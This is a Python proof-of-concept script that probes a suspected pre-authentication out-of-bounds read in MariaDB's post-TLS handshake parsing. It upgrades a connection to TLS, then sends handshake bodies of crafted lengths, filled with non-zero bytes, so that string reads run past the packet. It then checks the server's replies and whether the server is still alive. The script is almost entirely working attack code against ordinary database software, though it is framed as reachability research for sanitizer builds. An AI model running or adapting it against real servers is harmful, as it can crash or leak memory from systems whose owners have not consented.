#!/usr/bin/env python3
"""
Reachability PoC: post-TLS handshake-response packets shorter than 32 bytes.

parse_client_handshake_packet() validates the *pre*-TLS packet with
`if (pkt_len < 32) return packet_error;`, but the packet it reads back after
sslaccept() is only checked against NORMAL_HANDSHAKE_SIZE, which is 6:

    pkt_len= my_net_read(net);
    if (unlikely(pkt_len == packet_error || pkt_len < NORMAL_HANDSHAKE_SIZE))
      return packet_error;

The CLIENT_PROTOCOL_41 layout that follows is chosen from the *first* packet's
capability word and then reads read_pos[4..7] and read_pos[8] and sets
`end = read_pos + 32`. The only guard is

    if (end >= (char*) net->read_pos + pkt_len + 2) return packet_error;

which passes for every pkt_len >= 31. At pkt_len 31 and 32, `user = end` is at
or past the network layer's guaranteed NUL at read_pos[pkt_len], so strend(user)
and the auth-length read that follows reach past the packet body.

This script only establishes which lengths the server accepts into that code;
run it against an ASAN build to see whether the reads are flagged.
"""

import os
import socket
import ssl
import struct
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from mariadb_preauth import (  # noqa: E402
    Conn, CLIENT_SSL, CLIENT_PROTOCOL_41, CLIENT_SECURE_CONNECTION,
    CLIENT_LONG_PASSWORD, CLIENT_PLUGIN_AUTH,
    CLIENT_PLUGIN_AUTH_LENENC_CLIENT_DATA, CLIENT_CONNECT_WITH_DB,
)

SSL_REQUEST_CAPS = (CLIENT_LONG_PASSWORD | CLIENT_PROTOCOL_41 |
                    CLIENT_SECURE_CONNECTION | CLIENT_SSL)


def attempt(host, port, body_len, extra_caps=0, verbose=True):
    """Do the TLS upgrade, then send a body of exactly `body_len` bytes."""
    c = Conn(host, port, timeout=6.0)
    g = c.read_greeting()
    if g is None:
        return "no-greeting"
    if not (g["capabilities"] & CLIENT_SSL):
        return "server-has-no-tls"

    caps = SSL_REQUEST_CAPS | extra_caps
    # The SSLRequest packet is exactly the 32-byte prefix of a handshake
    # response: caps(4) max_packet(4) charset(1) filler(19) ext_caps(4).
    ssl_req = (struct.pack("<I", caps) + struct.pack("<I", 0x01000000) +
               bytes([45]) + b"\x00" * 19 + struct.pack("<I", 0))
    assert len(ssl_req) == 32
    c.send_packet(ssl_req)

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        ctx.set_ciphers("ALL:@SECLEVEL=0")
    except ssl.SSLError:
        pass
    try:
        tls = ctx.wrap_socket(c.sock, do_handshake_on_connect=True)
    except (ssl.SSLError, OSError) as exc:
        return f"tls-failed: {exc}"

    # Body is non-zero everywhere so that any strlen() past read_pos[pkt_len]
    # has to run into whatever follows the packet in net->buff.
    body = bytes(((i % 255) + 1) for i in range(body_len))
    hdr = struct.pack("<I", body_len)[:3] + bytes([c.seq & 0xff])
    try:
        tls.sendall(hdr + body)
    except OSError as exc:
        return f"send-failed: {exc}"

    try:
        rh = tls.recv(4)
        if not rh:
            return "closed-without-reply"
        rlen = rh[0] | (rh[1] << 8) | (rh[2] << 16)
        resp = b""
        while len(resp) < rlen:
            part = tls.recv(rlen - len(resp))
            if not part:
                break
            resp += part
    except (ssl.SSLError, OSError) as exc:
        return f"recv-failed: {exc}"
    finally:
        try:
            tls.close()
        except OSError:
            pass

    if resp[:1] == b"\xff":
        errno_ = struct.unpack("<H", resp[1:3])[0]
        msg = resp[9:].decode("latin1", "replace")
        return f"error {errno_}: {msg}"
    if resp[:1] == b"\x00":
        return "OK packet (authenticated!)"
    if resp[:1] == b"\xfe":
        return "auth-switch request"
    return f"other reply: {resp[:40].hex()}"


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 3306

    print("post-TLS body length -> server reply")
    print("  (31 and 32 are the lengths where `end = read_pos + 32` reaches")
    print("   the network layer's guaranteed NUL terminator)")
    for n in (6, 20, 29, 30, 31, 32, 33, 34, 40):
        for extra, label in ((0, "plain"),
                             (CLIENT_PLUGIN_AUTH_LENENC_CLIENT_DATA, "lenenc"),
                             (CLIENT_CONNECT_WITH_DB | CLIENT_PLUGIN_AUTH, "db+plugin")):
            res = attempt(host, port, n, extra_caps=extra)
            print(f"  len={n:<3} {label:<10} {res}")
    print()
    from mariadb_preauth import server_alive
    print(f"server still alive: {server_alive(host, port)}")


if __name__ == "__main__":
    main()
